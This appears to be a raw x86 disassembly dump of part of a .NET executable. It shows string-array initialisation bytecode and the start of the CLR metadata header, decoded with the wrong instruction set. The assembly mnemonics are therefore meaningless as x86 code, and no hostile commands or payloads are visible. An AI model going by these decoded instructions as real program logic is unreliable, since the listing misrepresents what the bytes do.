  4035bd:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035c0:	07                   	pop    %es
  4035c1:	20 9f 00 00 00 72    	and    %bl,0x72000000(%edi)
  4035c7:	1b 0e                	sbb    (%esi),%ecx
  4035c9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035cc:	07                   	pop    %es
  4035cd:	20 a0 00 00 00 72    	and    %ah,0x72000000(%eax)
  4035d3:	23 0e                	and    (%esi),%ecx
  4035d5:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035d8:	07                   	pop    %es
  4035d9:	20 a1 00 00 00 72    	and    %ah,0x72000000(%ecx)
  4035df:	2d 0e 00 70 a2       	sub    $0xa270000e,%eax
  4035e4:	07                   	pop    %es
  4035e5:	20 a2 00 00 00 72    	and    %ah,0x72000000(%edx)
  4035eb:	37                   	aaa
  4035ec:	0e                   	push   %cs
  4035ed:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035f0:	07                   	pop    %es
  4035f1:	20 a3 00 00 00 72    	and    %ah,0x72000000(%ebx)
  4035f7:	41                   	inc    %ecx
  4035f8:	0e                   	push   %cs
  4035f9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035fc:	07                   	pop    %es
  4035fd:	20 a4 00 00 00 72 4b 	and    %ah,0x4b720000(%eax,%eax,1)
  403604:	0e                   	push   %cs
  403605:	00 70 a2             	add    %dh,-0x5e(%eax)
  403608:	07                   	pop    %es
  403609:	20 a5 00 00 00 72    	and    %ah,0x72000000(%ebp)
  40360f:	55                   	push   %ebp
  403610:	0e                   	push   %cs
  403611:	00 70 a2             	add    %dh,-0x5e(%eax)
  403614:	07                   	pop    %es
  403615:	20 a6 00 00 00 72    	and    %ah,0x72000000(%esi)
  40361b:	5f                   	pop    %edi
  40361c:	0e                   	push   %cs
  40361d:	00 70 a2             	add    %dh,-0x5e(%eax)
  403620:	07                   	pop    %es
  403621:	20 a7 00 00 00 72    	and    %ah,0x72000000(%edi)
  403627:	69 0e 00 70 a2 07    	imul   $0x7a27000,(%esi),%ecx
  40362d:	20 a8 00 00 00 72    	and    %ch,0x72000000(%eax)
  403633:	75 0e                	jne    0x403643
  403635:	00 70 a2             	add    %dh,-0x5e(%eax)
  403638:	07                   	pop    %es
  403639:	20 a9 00 00 00 72    	and    %ch,0x72000000(%ecx)
  40363f:	7f 0e                	jg     0x40364f
  403641:	00 70 a2             	add    %dh,-0x5e(%eax)
  403644:	07                   	pop    %es
  403645:	20 aa 00 00 00 72    	and    %ch,0x72000000(%edx)
  40364b:	8b 0e                	mov    (%esi),%ecx
  40364d:	00 70 a2             	add    %dh,-0x5e(%eax)
  403650:	07                   	pop    %es
  403651:	20 ab 00 00 00 72    	and    %ch,0x72000000(%ebx)
  403657:	95                   	xchg   %eax,%ebp
  403658:	0e                   	push   %cs
  403659:	00 70 a2             	add    %dh,-0x5e(%eax)
  40365c:	07                   	pop    %es
  40365d:	20 ac 00 00 00 72 9f 	and    %ch,-0x608e0000(%eax,%eax,1)
  403664:	0e                   	push   %cs
  403665:	00 70 a2             	add    %dh,-0x5e(%eax)
  403668:	07                   	pop    %es
  403669:	20 ad 00 00 00 72    	and    %ch,0x72000000(%ebp)
  40366f:	a9 0e 00 70 a2       	test   $0xa270000e,%eax
  403674:	07                   	pop    %es
  403675:	20 ae 00 00 00 72    	and    %ch,0x72000000(%esi)
  40367b:	b3 0e                	mov    $0xe,%bl
  40367d:	00 70 a2             	add    %dh,-0x5e(%eax)
  403680:	07                   	pop    %es
  403681:	20 af 00 00 00 72    	and    %ch,0x72000000(%edi)
  403687:	bd 0e 00 70 a2       	mov    $0xa270000e,%ebp
  40368c:	07                   	pop    %es
  40368d:	20 b0 00 00 00 72    	and    %dh,0x72000000(%eax)
  403693:	c7                   	(bad)
  403694:	0e                   	push   %cs
  403695:	00 70 a2             	add    %dh,-0x5e(%eax)
  403698:	07                   	pop    %es
  403699:	20 b1 00 00 00 72    	and    %dh,0x72000000(%ecx)
  40369f:	d3 0e                	rorl   %cl,(%esi)
  4036a1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036a4:	07                   	pop    %es
  4036a5:	20 b2 00 00 00 72    	and    %dh,0x72000000(%edx)
  4036ab:	df 0e                	fisttps (%esi)
  4036ad:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036b0:	07                   	pop    %es
  4036b1:	20 b3 00 00 00 72    	and    %dh,0x72000000(%ebx)
  4036b7:	e9 0e 00 70 a2       	jmp    0xa2b036ca
  4036bc:	07                   	pop    %es
  4036bd:	20 b4 00 00 00 72 f3 	and    %dh,-0xc8e0000(%eax,%eax,1)
  4036c4:	0e                   	push   %cs
  4036c5:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036c8:	07                   	pop    %es
  4036c9:	20 b5 00 00 00 72    	and    %dh,0x72000000(%ebp)
  4036cf:	fd                   	std
  4036d0:	0e                   	push   %cs
  4036d1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036d4:	07                   	pop    %es
  4036d5:	20 b6 00 00 00 72    	and    %dh,0x72000000(%esi)
  4036db:	07                   	pop    %es
  4036dc:	0f 00                	(bad)
  4036de:	70 a2                	jo     0x403682
  4036e0:	07                   	pop    %es
  4036e1:	20 b7 00 00 00 72    	and    %dh,0x72000000(%edi)
  4036e7:	11 0f                	adc    %ecx,(%edi)
  4036e9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036ec:	07                   	pop    %es
  4036ed:	20 b8 00 00 00 72    	and    %bh,0x72000000(%eax)
  4036f3:	1b 0f                	sbb    (%edi),%ecx
  4036f5:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036f8:	07                   	pop    %es
  4036f9:	20 b9 00 00 00 72    	and    %bh,0x72000000(%ecx)
  4036ff:	25 0f 00 70 a2       	and    $0xa270000f,%eax
  403704:	07                   	pop    %es
  403705:	20 ba 00 00 00 72    	and    %bh,0x72000000(%edx)
  40370b:	2f                   	das
  40370c:	0f 00                	(bad)
  40370e:	70 a2                	jo     0x4036b2
  403710:	07                   	pop    %es
  403711:	20 bb 00 00 00 72    	and    %bh,0x72000000(%ebx)
  403717:	39 0f                	cmp    %ecx,(%edi)
  403719:	00 70 a2             	add    %dh,-0x5e(%eax)
  40371c:	07                   	pop    %es
  40371d:	20 bc 00 00 00 72 43 	and    %bh,0x43720000(%eax,%eax,1)
  403724:	0f 00                	(bad)
  403726:	70 a2                	jo     0x4036ca
  403728:	07                   	pop    %es
  403729:	20 bd 00 00 00 72    	and    %bh,0x72000000(%ebp)
  40372f:	4d                   	dec    %ebp
  403730:	0f 00                	(bad)
  403732:	70 a2                	jo     0x4036d6
  403734:	07                   	pop    %es
  403735:	20 be 00 00 00 72    	and    %bh,0x72000000(%esi)
  40373b:	57                   	push   %edi
  40373c:	0f 00                	(bad)
  40373e:	70 a2                	jo     0x4036e2
  403740:	07                   	pop    %es
  403741:	20 bf 00 00 00 72    	and    %bh,0x72000000(%edi)
  403747:	61                   	popa
  403748:	0f 00                	(bad)
  40374a:	70 a2                	jo     0x4036ee
  40374c:	07                   	pop    %es
  40374d:	20 c0                	and    %al,%al
  40374f:	00 00                	add    %al,(%eax)
  403751:	00 72 6b             	add    %dh,0x6b(%edx)
  403754:	0f 00                	(bad)
  403756:	70 a2                	jo     0x4036fa
  403758:	07                   	pop    %es
  403759:	20 c1                	and    %al,%cl
  40375b:	00 00                	add    %al,(%eax)
  40375d:	00 72 75             	add    %dh,0x75(%edx)
  403760:	0f 00                	(bad)
  403762:	70 a2                	jo     0x403706
  403764:	07                   	pop    %es
  403765:	20 c2                	and    %al,%dl
  403767:	00 00                	add    %al,(%eax)
  403769:	00 72 7f             	add    %dh,0x7f(%edx)
  40376c:	0f 00                	(bad)
  40376e:	70 a2                	jo     0x403712
  403770:	07                   	pop    %es
  403771:	20 c3                	and    %al,%bl
  403773:	00 00                	add    %al,(%eax)
  403775:	00 72 8d             	add    %dh,-0x73(%edx)
  403778:	0f 00                	(bad)
  40377a:	70 a2                	jo     0x40371e
  40377c:	07                   	pop    %es
  40377d:	20 c4                	and    %al,%ah
  40377f:	00 00                	add    %al,(%eax)
  403781:	00 72 97             	add    %dh,-0x69(%edx)
  403784:	0f 00                	(bad)
  403786:	70 a2                	jo     0x40372a
  403788:	07                   	pop    %es
  403789:	20 c5                	and    %al,%ch
  40378b:	00 00                	add    %al,(%eax)
  40378d:	00 72 a1             	add    %dh,-0x5f(%edx)
  403790:	0f 00                	(bad)
  403792:	70 a2                	jo     0x403736
  403794:	07                   	pop    %es
  403795:	20 c6                	and    %al,%dh
  403797:	00 00                	add    %al,(%eax)
  403799:	00 72 ab             	add    %dh,-0x55(%edx)
  40379c:	0f 00                	(bad)
  40379e:	70 a2                	jo     0x403742
  4037a0:	07                   	pop    %es
  4037a1:	20 c7                	and    %al,%bh
  4037a3:	00 00                	add    %al,(%eax)
  4037a5:	00 72 b5             	add    %dh,-0x4b(%edx)
  4037a8:	0f 00                	(bad)
  4037aa:	70 a2                	jo     0x40374e
  4037ac:	07                   	pop    %es
  4037ad:	20 c8                	and    %cl,%al
  4037af:	00 00                	add    %al,(%eax)
  4037b1:	00 72 bf             	add    %dh,-0x41(%edx)
  4037b4:	0f 00                	(bad)
  4037b6:	70 a2                	jo     0x40375a
  4037b8:	07                   	pop    %es
  4037b9:	20 c9                	and    %cl,%cl
  4037bb:	00 00                	add    %al,(%eax)
  4037bd:	00 72 c9             	add    %dh,-0x37(%edx)
  4037c0:	0f 00                	(bad)
  4037c2:	70 a2                	jo     0x403766
  4037c4:	07                   	pop    %es
  4037c5:	20 ca                	and    %cl,%dl
  4037c7:	00 00                	add    %al,(%eax)
  4037c9:	00 72 d1             	add    %dh,-0x2f(%edx)
  4037cc:	0f 00                	(bad)
  4037ce:	70 a2                	jo     0x403772
  4037d0:	07                   	pop    %es
  4037d1:	20 cb                	and    %cl,%bl
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	00 72 db             	add    %dh,-0x25(%edx)
  4037d8:	0f 00                	(bad)
  4037da:	70 a2                	jo     0x40377e
  4037dc:	07                   	pop    %es
  4037dd:	20 cc                	and    %cl,%ah
  4037df:	00 00                	add    %al,(%eax)
  4037e1:	00 72 e7             	add    %dh,-0x19(%edx)
  4037e4:	0f 00                	(bad)
  4037e6:	70 a2                	jo     0x40378a
  4037e8:	07                   	pop    %es
  4037e9:	20 cd                	and    %cl,%ch
  4037eb:	00 00                	add    %al,(%eax)
  4037ed:	00 72 f1             	add    %dh,-0xf(%edx)
  4037f0:	0f 00                	(bad)
  4037f2:	70 a2                	jo     0x403796
  4037f4:	07                   	pop    %es
  4037f5:	20 ce                	and    %cl,%dh
  4037f7:	00 00                	add    %al,(%eax)
  4037f9:	00 72 fb             	add    %dh,-0x5(%edx)
  4037fc:	0f 00                	(bad)
  4037fe:	70 a2                	jo     0x4037a2
  403800:	07                   	pop    %es
  403801:	20 cf                	and    %cl,%bh
  403803:	00 00                	add    %al,(%eax)
  403805:	00 72 05             	add    %dh,0x5(%edx)
  403808:	10 00                	adc    %al,(%eax)
  40380a:	70 a2                	jo     0x4037ae
  40380c:	07                   	pop    %es
  40380d:	20 d0                	and    %dl,%al
  40380f:	00 00                	add    %al,(%eax)
  403811:	00 72 0f             	add    %dh,0xf(%edx)
  403814:	10 00                	adc    %al,(%eax)
  403816:	70 a2                	jo     0x4037ba
  403818:	07                   	pop    %es
  403819:	20 d1                	and    %dl,%cl
  40381b:	00 00                	add    %al,(%eax)
  40381d:	00 72 19             	add    %dh,0x19(%edx)
  403820:	10 00                	adc    %al,(%eax)
  403822:	70 a2                	jo     0x4037c6
  403824:	07                   	pop    %es
  403825:	20 d2                	and    %dl,%dl
  403827:	00 00                	add    %al,(%eax)
  403829:	00 72 25             	add    %dh,0x25(%edx)
  40382c:	10 00                	adc    %al,(%eax)
  40382e:	70 a2                	jo     0x4037d2
  403830:	07                   	pop    %es
  403831:	20 d3                	and    %dl,%bl
  403833:	00 00                	add    %al,(%eax)
  403835:	00 72 31             	add    %dh,0x31(%edx)
  403838:	10 00                	adc    %al,(%eax)
  40383a:	70 a2                	jo     0x4037de
  40383c:	07                   	pop    %es
  40383d:	20 d4                	and    %dl,%ah
  40383f:	00 00                	add    %al,(%eax)
  403841:	00 72 3b             	add    %dh,0x3b(%edx)
  403844:	10 00                	adc    %al,(%eax)
  403846:	70 a2                	jo     0x4037ea
  403848:	07                   	pop    %es
  403849:	20 d5                	and    %dl,%ch
  40384b:	00 00                	add    %al,(%eax)
  40384d:	00 72 4b             	add    %dh,0x4b(%edx)
  403850:	10 00                	adc    %al,(%eax)
  403852:	70 a2                	jo     0x4037f6
  403854:	07                   	pop    %es
  403855:	20 d6                	and    %dl,%dh
  403857:	00 00                	add    %al,(%eax)
  403859:	00 72 55             	add    %dh,0x55(%edx)
  40385c:	10 00                	adc    %al,(%eax)
  40385e:	70 a2                	jo     0x403802
  403860:	07                   	pop    %es
  403861:	20 d7                	and    %dl,%bh
  403863:	00 00                	add    %al,(%eax)
  403865:	00 72 5d             	add    %dh,0x5d(%edx)
  403868:	10 00                	adc    %al,(%eax)
  40386a:	70 a2                	jo     0x40380e
  40386c:	07                   	pop    %es
  40386d:	20 d8                	and    %bl,%al
  40386f:	00 00                	add    %al,(%eax)
  403871:	00 72 67             	add    %dh,0x67(%edx)
  403874:	10 00                	adc    %al,(%eax)
  403876:	70 a2                	jo     0x40381a
  403878:	07                   	pop    %es
  403879:	20 d9                	and    %bl,%cl
  40387b:	00 00                	add    %al,(%eax)
  40387d:	00 72 71             	add    %dh,0x71(%edx)
  403880:	10 00                	adc    %al,(%eax)
  403882:	70 a2                	jo     0x403826
  403884:	07                   	pop    %es
  403885:	20 da                	and    %bl,%dl
  403887:	00 00                	add    %al,(%eax)
  403889:	00 72 7b             	add    %dh,0x7b(%edx)
  40388c:	10 00                	adc    %al,(%eax)
  40388e:	70 a2                	jo     0x403832
  403890:	07                   	pop    %es
  403891:	20 db                	and    %bl,%bl
  403893:	00 00                	add    %al,(%eax)
  403895:	00 72 85             	add    %dh,-0x7b(%edx)
  403898:	10 00                	adc    %al,(%eax)
  40389a:	70 a2                	jo     0x40383e
  40389c:	07                   	pop    %es
  40389d:	20 dc                	and    %bl,%ah
  40389f:	00 00                	add    %al,(%eax)
  4038a1:	00 72 8f             	add    %dh,-0x71(%edx)
  4038a4:	10 00                	adc    %al,(%eax)
  4038a6:	70 a2                	jo     0x40384a
  4038a8:	07                   	pop    %es
  4038a9:	20 dd                	and    %bl,%ch
  4038ab:	00 00                	add    %al,(%eax)
  4038ad:	00 72 9b             	add    %dh,-0x65(%edx)
  4038b0:	10 00                	adc    %al,(%eax)
  4038b2:	70 a2                	jo     0x403856
  4038b4:	07                   	pop    %es
  4038b5:	20 de                	and    %bl,%dh
  4038b7:	00 00                	add    %al,(%eax)
  4038b9:	00 72 a5             	add    %dh,-0x5b(%edx)
  4038bc:	10 00                	adc    %al,(%eax)
  4038be:	70 a2                	jo     0x403862
  4038c0:	07                   	pop    %es
  4038c1:	20 df                	and    %bl,%bh
  4038c3:	00 00                	add    %al,(%eax)
  4038c5:	00 72 11             	add    %dh,0x11(%edx)
  4038c8:	0c 00                	or     $0x0,%al
  4038ca:	70 a2                	jo     0x40386e
  4038cc:	07                   	pop    %es
  4038cd:	20 e0                	and    %ah,%al
  4038cf:	00 00                	add    %al,(%eax)
  4038d1:	00 72 af             	add    %dh,-0x51(%edx)
  4038d4:	10 00                	adc    %al,(%eax)
  4038d6:	70 a2                	jo     0x40387a
  4038d8:	07                   	pop    %es
  4038d9:	20 e1                	and    %ah,%cl
  4038db:	00 00                	add    %al,(%eax)
  4038dd:	00 72 c1             	add    %dh,-0x3f(%edx)
  4038e0:	10 00                	adc    %al,(%eax)
  4038e2:	70 a2                	jo     0x403886
  4038e4:	07                   	pop    %es
  4038e5:	20 e2                	and    %ah,%dl
  4038e7:	00 00                	add    %al,(%eax)
  4038e9:	00 72 cb             	add    %dh,-0x35(%edx)
  4038ec:	10 00                	adc    %al,(%eax)
  4038ee:	70 a2                	jo     0x403892
  4038f0:	07                   	pop    %es
  4038f1:	20 e3                	and    %ah,%bl
  4038f3:	00 00                	add    %al,(%eax)
  4038f5:	00 72 d5             	add    %dh,-0x2b(%edx)
  4038f8:	10 00                	adc    %al,(%eax)
  4038fa:	70 a2                	jo     0x40389e
  4038fc:	07                   	pop    %es
  4038fd:	20 e4                	and    %ah,%ah
  4038ff:	00 00                	add    %al,(%eax)
  403901:	00 72 df             	add    %dh,-0x21(%edx)
  403904:	10 00                	adc    %al,(%eax)
  403906:	70 a2                	jo     0x4038aa
  403908:	07                   	pop    %es
  403909:	80 1b 00             	sbbb   $0x0,(%ebx)
  40390c:	00 04 73             	add    %al,(%ebx,%esi,2)
  40390f:	19 00                	sbb    %eax,(%eax)
  403911:	00 0a                	add    %cl,(%edx)
  403913:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  403917:	04 2a                	add    $0x2a,%al
  403919:	1e                   	push   %ds
  40391a:	02 28                	add    (%eax),%ch
  40391c:	25 00 00 0a 2a       	and    $0x2a0a0000,%eax
  403921:	36 1f                	ss pop %ds
  403923:	fd                   	std
  403924:	73 71                	jae    0x403997
  403926:	00 00                	add    %al,(%eax)
  403928:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  40392e:	2a 1e                	sub    (%esi),%bl
  403930:	02 28                	add    (%eax),%ch
  403932:	25 00 00 0a 2a       	and    $0x2a0a0000,%eax
  403937:	92                   	xchg   %eax,%edx
  403938:	02 28                	add    (%eax),%ch
  40393a:	72 00                	jb     0x40393c
  40393c:	00 0a                	add    %cl,(%edx)
  40393e:	02 28                	add    (%eax),%ch
  403940:	73 00                	jae    0x403942
  403942:	00 0a                	add    %cl,(%edx)
  403944:	7e 1f                	jle    0x403965
  403946:	00 00                	add    %al,(%eax)
  403948:	04 28                	add    $0x28,%al
  40394a:	21 00                	and    %eax,(%eax)
  40394c:	00 06                	add    %al,(%esi)
  40394e:	26 02 28             	add    %es:(%eax),%ch
  403951:	73 00                	jae    0x403953
  403953:	00 0a                	add    %cl,(%edx)
  403955:	28 20                	sub    %ah,(%eax)
  403957:	00 00                	add    %al,(%eax)
  403959:	06                   	push   %es
  40395a:	26 2a 5a 03          	sub    %es:0x3(%edx),%bl
  40395e:	7e 20                	jle    0x403980
  403960:	00 00                	add    %al,(%eax)
  403962:	04 6f                	add    $0x6f,%al
  403964:	74 00                	je     0x403966
  403966:	00 0a                	add    %cl,(%edx)
  403968:	6f                   	outsl  %ds:(%esi),(%dx)
  403969:	75 00                	jne    0x40396b
  40396b:	00 0a                	add    %cl,(%edx)
  40396d:	2c 02                	sub    $0x2,%al
  40396f:	17                   	pop    %ss
  403970:	2a 16                	sub    (%esi),%dl
  403972:	2a 00                	sub    (%eax),%al
  403974:	13 30                	adc    (%eax),%esi
  403976:	03 00                	add    (%eax),%eax
  403978:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403979:	00 00                	add    %al,(%eax)
  40397b:	00 01                	add    %al,(%ecx)
  40397d:	00 00                	add    %al,(%eax)
  40397f:	11 03                	adc    %eax,(%ebx)
  403981:	28 76 00             	sub    %dh,0x0(%esi)
  403984:	00 0a                	add    %cl,(%edx)
  403986:	20 1d 03 00 00 40    	and    %bl,0x40000003
  40398c:	8f 00                	pop    (%eax)
  40398e:	00 00                	add    %al,(%eax)
  403990:	28 28                	sub    %ch,(%eax)
  403992:	00 00                	add    %al,(%eax)
  403994:	06                   	push   %es
  403995:	80 20 00             	andb   $0x0,(%eax)
  403998:	00 04 7e             	add    %al,(%esi,%edi,2)
  40399b:	20 00                	and    %al,(%eax)
  40399d:	00 04 72             	add    %al,(%edx,%esi,2)
  4039a0:	e9 10 00 70 6f       	jmp    0x6fb039b5
  4039a5:	77 00                	ja     0x4039a7
  4039a7:	00 0a                	add    %cl,(%edx)
  4039a9:	2c 3b                	sub    $0x3b,%al
  4039ab:	02 7e 19             	add    0x19(%esi),%bh
  4039ae:	00 00                	add    %al,(%eax)
  4039b0:	04 28                	add    $0x28,%al
  4039b2:	25 00 00 06 2c       	and    $0x2c060000,%eax
  4039b7:	67 7e 20             	addr16 jle 0x4039da
  4039ba:	00 00                	add    %al,(%eax)
  4039bc:	04 7e                	add    $0x7e,%al
  4039be:	18 00                	sbb    %al,(%eax)
  4039c0:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4039c3:	78 00                	js     0x4039c5
  4039c5:	00 0a                	add    %cl,(%edx)
  4039c7:	2d 56 7e 19 00       	sub    $0x197e56,%eax
  4039cc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4039cf:	20 00                	and    %al,(%eax)
  4039d1:	00 04 7e             	add    %al,(%esi,%edi,2)
  4039d4:	18 00                	sbb    %al,(%eax)
  4039d6:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4039d9:	79 00                	jns    0x4039db
  4039db:	00 0a                	add    %cl,(%edx)
  4039dd:	0a 06                	or     (%esi),%al
  4039df:	28 29                	sub    %ch,(%ecx)
  4039e1:	00 00                	add    %al,(%eax)
  4039e3:	06                   	push   %es
  4039e4:	2b 39                	sub    (%ecx),%edi
  4039e6:	02 7e 19             	add    0x19(%esi),%bh
  4039e9:	00 00                	add    %al,(%eax)
  4039eb:	04 28                	add    $0x28,%al
  4039ed:	25 00 00 06 2c       	and    $0x2c060000,%eax
  4039f2:	2c 7e                	sub    $0x7e,%al
  4039f4:	20 00                	and    %al,(%eax)
  4039f6:	00 04 7e             	add    %al,(%esi,%edi,2)
  4039f9:	16                   	push   %ss
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	04 6f                	add    $0x6f,%al
  4039fe:	78 00                	js     0x403a00
  403a00:	00 0a                	add    %cl,(%edx)
  403a02:	2d 1b 7e 19 00       	sub    $0x197e1b,%eax
  403a07:	00 04 7e             	add    %al,(%esi,%edi,2)
  403a0a:	20 00                	and    %al,(%eax)
  403a0c:	00 04 7e             	add    %al,(%esi,%edi,2)
  403a0f:	16                   	push   %ss
  403a10:	00 00                	add    %al,(%eax)
  403a12:	04 6f                	add    $0x6f,%al
  403a14:	79 00                	jns    0x403a16
  403a16:	00 0a                	add    %cl,(%edx)
  403a18:	0b 07                	or     (%edi),%eax
  403a1a:	28 29                	sub    %ch,(%ecx)
  403a1c:	00 00                	add    %al,(%eax)
  403a1e:	06                   	push   %es
  403a1f:	02 03                	add    (%ebx),%al
  403a21:	28 7a 00             	sub    %bh,0x0(%edx)
  403a24:	00 0a                	add    %cl,(%edx)
  403a26:	2a 00                	sub    (%eax),%al
  403a28:	13 30                	adc    (%eax),%esi
  403a2a:	03 00                	add    (%eax),%eax
  403a2c:	1b 00                	sbb    (%eax),%eax
  403a2e:	00 00                	add    %al,(%eax)
  403a30:	16                   	push   %ss
  403a31:	00 00                	add    %al,(%eax)
  403a33:	11 02                	adc    %eax,(%edx)
  403a35:	28 7b 00             	sub    %bh,0x0(%ebx)
  403a38:	00 0a                	add    %cl,(%edx)
  403a3a:	0a 06                	or     (%esi),%al
  403a3c:	25 6f 7c 00 00       	and    $0x7c6f,%eax
  403a41:	0a 20                	or     (%eax),%ah
  403a43:	80 00 00             	addb   $0x0,(%eax)
  403a46:	00 60 6f             	add    %ah,0x6f(%eax)
  403a49:	7d 00                	jge    0x403a4b
  403a4b:	00 0a                	add    %cl,(%edx)
  403a4d:	06                   	push   %es
  403a4e:	2a 1e                	sub    (%esi),%bl
  403a50:	02 28                	add    (%eax),%ch
  403a52:	25 00 00 0a 2a       	and    $0x2a0a0000,%eax
  403a57:	32 02                	xor    (%edx),%al
  403a59:	28 7e 00             	sub    %bh,0x0(%esi)
  403a5c:	00 0a                	add    %cl,(%edx)
  403a5e:	7d 23                	jge    0x403a83
  403a60:	00 00                	add    %al,(%eax)
  403a62:	04 2a                	add    $0x2a,%al
  403a64:	13 30                	adc    (%eax),%esi
  403a66:	02 00                	add    (%eax),%al
  403a68:	3d 00 00 00 17       	cmp    $0x17000000,%eax
  403a6d:	00 00                	add    %al,(%eax)
  403a6f:	11 73 2d             	adc    %esi,0x2d(%ebx)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	06                   	push   %es
  403a75:	0b 07                	or     (%edi),%eax
  403a77:	7e 7f                	jle    0x403af8
  403a79:	00 00                	add    %al,(%eax)
  403a7b:	0a 7d 23             	or     0x23(%ebp),%bh
  403a7e:	00 00                	add    %al,(%eax)
  403a80:	04 07                	add    $0x7,%al
  403a82:	fe 06                	incb   (%esi)
  403a84:	2e 00 00             	add    %al,%cs:(%eax)
  403a87:	06                   	push   %es
  403a88:	73 07                	jae    0x403a91
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 73 08             	or     0x8(%ebx),%dh
  403a8f:	00 00                	add    %al,(%eax)
  403a91:	0a 0a                	or     (%edx),%cl
  403a93:	06                   	push   %es
  403a94:	16                   	push   %ss
  403a95:	6f                   	outsl  %ds:(%esi),(%dx)
  403a96:	80 00 00             	addb   $0x0,(%eax)
  403a99:	0a 06                	or     (%esi),%al
  403a9b:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9c:	09 00                	or     %eax,(%eax)
  403a9e:	00 0a                	add    %cl,(%edx)
  403aa0:	06                   	push   %es
  403aa1:	6f                   	outsl  %ds:(%esi),(%dx)
  403aa2:	81 00 00 0a 07 7b    	addl   $0x7b070a00,(%eax)
  403aa8:	23 00                	and    (%eax),%eax
  403aaa:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403aad:	1e                   	push   %ds
  403aae:	02 28                	add    (%eax),%ch
  403ab0:	25 00 00 0a 2a       	and    $0x2a0a0000,%eax
  403ab5:	32 02                	xor    (%edx),%al
  403ab7:	7b 24                	jnp    0x403add
  403ab9:	00 00                	add    %al,(%eax)
  403abb:	04 28                	add    $0x28,%al
  403abd:	82 00 00             	addb   $0x0,(%eax)
  403ac0:	0a 2a                	or     (%edx),%ch
  403ac2:	00 00                	add    %al,(%eax)
  403ac4:	13 30                	adc    (%eax),%esi
  403ac6:	02 00                	add    (%eax),%al
  403ac8:	33 00                	xor    (%eax),%eax
  403aca:	00 00                	add    %al,(%eax)
  403acc:	18 00                	sbb    %al,(%eax)
  403ace:	00 11                	add    %dl,(%ecx)
  403ad0:	73 2f                	jae    0x403b01
  403ad2:	00 00                	add    %al,(%eax)
  403ad4:	06                   	push   %es
  403ad5:	0b 07                	or     (%edi),%eax
  403ad7:	02 7d 24             	add    0x24(%ebp),%bh
  403ada:	00 00                	add    %al,(%eax)
  403adc:	04 07                	add    $0x7,%al
  403ade:	fe 06                	incb   (%esi)
  403ae0:	30 00                	xor    %al,(%eax)
  403ae2:	00 06                	add    %al,(%esi)
  403ae4:	73 07                	jae    0x403aed
  403ae6:	00 00                	add    %al,(%eax)
  403ae8:	0a 73 08             	or     0x8(%ebx),%dh
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	0a 0a                	or     (%edx),%cl
  403aef:	06                   	push   %es
  403af0:	16                   	push   %ss
  403af1:	6f                   	outsl  %ds:(%esi),(%dx)
  403af2:	80 00 00             	addb   $0x0,(%eax)
  403af5:	0a 06                	or     (%esi),%al
  403af7:	6f                   	outsl  %ds:(%esi),(%dx)
  403af8:	09 00                	or     %eax,(%eax)
  403afa:	00 0a                	add    %cl,(%edx)
  403afc:	06                   	push   %es
  403afd:	6f                   	outsl  %ds:(%esi),(%dx)
  403afe:	81 00 00 0a 2a 2e    	addl   $0x2e2a0a00,(%eax)
  403b04:	28 28                	sub    %ch,(%eax)
  403b06:	00 00                	add    %al,(%eax)
  403b08:	06                   	push   %es
  403b09:	80 20 00             	andb   $0x0,(%eax)
  403b0c:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403b0f:	00 42 53             	add    %al,0x53(%edx)
  403b12:	4a                   	dec    %edx
  403b13:	42                   	inc    %edx
  403b14:	01 00                	add    %eax,(%eax)
  403b16:	01 00                	add    %eax,(%eax)
  403b18:	00 00                	add    %al,(%eax)
  403b1a:	00 00                	add    %al,(%eax)
  403b1c:	0c 00                	or     $0x0,%al
  403b1e:	00 00                	add    %al,(%eax)
  403b20:	76 34                	jbe    0x403b56
  403b22:	2e 30 2e             	xor    %ch,%cs:(%esi)
  403b25:	33 30                	xor    (%eax),%esi
  403b27:	33 31                	xor    (%ecx),%esi
  403b29:	39 00                	cmp    %eax,(%eax)
  403b2b:	00 00                	add    %al,(%eax)
  403b2d:	00 05 00 6c 00 00    	add    %al,0x6c00
  403b33:	00 c0                	add    %al,%al
  403b35:	0a 00                	or     (%eax),%al
  403b37:	00 23                	add    %ah,(%ebx)
  403b39:	7e 00                	jle    0x403b3b
  403b3b:	00 2c 0b             	add    %ch,(%ebx,%ecx,1)
  403b3e:	00 00                	add    %al,(%eax)
  403b40:	5c                   	pop    %esp
  403b41:	0e                   	push   %cs
  403b42:	00 00                	add    %al,(%eax)
  403b44:	23 53 74             	and    0x74(%ebx),%edx
  403b47:	72 69                	jb     0x403bb2
  403b49:	6e                   	outsb  %ds:(%esi),(%dx)
  403b4a:	67 73 00             	addr16 jae 0x403b4d
  403b4d:	00 00                	add    %al,(%eax)
  403b4f:	00 88 19 00 00 f4    	add    %cl,-0xbffffe7(%eax)
  403b55:	10 00                	adc    %al,(%eax)
  403b57:	00 23                	add    %ah,(%ebx)
  403b59:	55                   	push   %ebp
  403b5a:	53                   	push   %ebx
  403b5b:	00 7c 2a 00          	add    %bh,0x0(%edx,%ebp,1)
  403b5f:	00 10                	add    %dl,(%eax)
  403b61:	00 00                	add    %al,(%eax)
  403b63:	00 23                	add    %ah,(%ebx)
  403b65:	47                   	inc    %edi
  403b66:	55                   	push   %ebp
  403b67:	49                   	dec    %ecx
